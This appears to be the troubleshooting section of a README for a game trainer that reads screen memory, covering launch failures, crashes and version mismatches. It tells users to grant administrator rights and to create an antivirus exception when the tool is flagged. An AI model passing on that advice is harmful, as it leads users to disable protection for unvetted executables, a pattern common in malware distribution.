## 🛠️ Troubleshooting common issues

If you encounter problems, check these solutions:

* Software fails to open: Ensure you gave administrator rights. Check if your antivirus software flagged the tool. You may need to create an exception for the folder where you saved the installer.
* Features do not trigger: Confirm that the game is running in Windowed or Borderless Windowed mode. This allows the trainer to read the screen memory accurately. 
* Game crash: Close any heavy background applications like video recording software or browser tabs that use high memory. 
* Version mismatch: If the game updates, check the main repository link again. New versions appear there to match the current game version. Always use the most recent download to avoid conflicts or errors.
